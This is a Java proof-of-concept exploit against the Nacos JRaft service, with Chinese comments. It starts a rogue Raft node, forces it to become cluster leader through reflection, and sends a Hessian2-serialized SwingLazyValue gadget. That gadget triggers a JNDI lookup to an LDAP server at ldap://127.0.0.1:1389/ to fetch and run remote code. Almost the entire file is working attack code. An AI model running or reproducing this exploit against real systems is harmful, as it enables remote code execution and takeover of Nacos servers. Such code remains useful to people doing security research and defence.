package com.example;

import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alipay.sofa.jraft.CliService;
import com.alipay.sofa.jraft.RaftGroupService;
import com.alipay.sofa.jraft.RaftServiceFactory;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.conf.ConfigurationEntry;
import com.alipay.sofa.jraft.core.NodeImpl;
import com.alipay.sofa.jraft.core.State;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.entity.Task;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.option.NodeOptions;
import com.alipay.sofa.jraft.rpc.CliClientService;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.google.protobuf.ByteString;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.Map;

public class AnotherDemo {

    public static void main(String[] args) throws Exception {

        RouteTable rt = RouteTable.getInstance();
        Configuration conf = new Configuration();

        // 恶意 Raft Server
        PeerId serverId = new PeerId();
        serverId.parse("127.0.0.1:7849");

        // 目标 nacos Raft Server
        PeerId peerId = new PeerId();
        peerId.parse("127.0.0.1:7848");

        String groupId = "naming_instance_metadata";

        // 添加至 Raft Group
        conf.addPeer(serverId);
        conf.addPeer(peerId);

        // 初始化 CliService 和 CliClientService 客户端
        CliService cliService =  RaftServiceFactory.createAndInitCliService(new CliOptions());
        CliClientService cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());

        // 启动恶意 Raft Server
        NodeOptions nodeOptions = new NodeOptions();
        nodeOptions.setLogUri("log-storage");
        nodeOptions.setRaftMetaUri("raftmeta-storage");
        nodeOptions.setElectionTimeoutMs(100000);
        nodeOptions.setFsm(new MyStateMachine());
        RaftGroupService cluster = new RaftGroupService(groupId, serverId, nodeOptions);
        NodeImpl node = (NodeImpl) cluster.start();

        // 刷新路由表
        rt.updateConfiguration(groupId, conf);

        if(rt.refreshLeader(cliClientService, groupId, 10000).isOk()){
            // 获取集群当前 leader 节点
            PeerId leader = rt.selectLeader(groupId);
            System.out.println(leader);
        }

//        Set<String > set = new HashSet<>();
//        set.add(groupId);
//
//        Map<String, PeerId> map = new HashMap<>();
//        map.put("a", serverId);
//        map.put("b", peerId);
//
        // 修改集群 leader 为恶意 Raft Server 节点
//        Status result = cliService.rebalance(set, conf, map);
//        Status result = cliService.transferLeader(groupId, conf, serverId);
//        System.out.println(result);

        Field f = NodeImpl.class.getDeclaredField("conf");
        f.setAccessible(true);
        ConfigurationEntry configurationEntry = (ConfigurationEntry) f.get(node);

        configurationEntry.getConf().addPeer(serverId);
        configurationEntry.getConf().addPeer(peerId);

        f = NodeImpl.class.getDeclaredField("state");
        f.setAccessible(true);
        f.set(node, State.STATE_CANDIDATE);

        f = NodeImpl.class.getDeclaredField("currTerm");
        f.setAccessible(true);
        long currTerm = (long) f.get(node);
        f.set(node, currTerm + 1);

        Method m = NodeImpl.class.getDeclaredMethod("becomeLeader");
        m.setAccessible(true);
        m.invoke(node);

        // 获取集群当前 leader 节点
        rt.refreshLeader(cliClientService, groupId, 10000).isOk();
        PeerId leader = rt.selectLeader(groupId);
        System.out.println(leader);

        SwingLazyValue swingLazyValue = new SwingLazyValue("javax.naming.InitialContext","doLookup",new String[]{"ldap://127.0.0.1:1389/"});

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", swingLazyValue);
        u2.put("aaa", swingLazyValue);

        Map map = HashColl.makeMap(u1, u2);

        byte[] payload = Serialization.hessian2Serialize(map);

        WriteRequest writeRequest = WriteRequest.newBuilder().setGroup(groupId).setData(ByteString.copyFrom(payload)).build();

        // apply Task, 调用 setData 设置一个 WriteRequest 实例
        Task task = new Task();
        task.setData(ByteBuffer.wrap(ByteString.copyFrom(writeRequest.toByteArray()).toByteArray()));

        node.apply(task);

    }
}
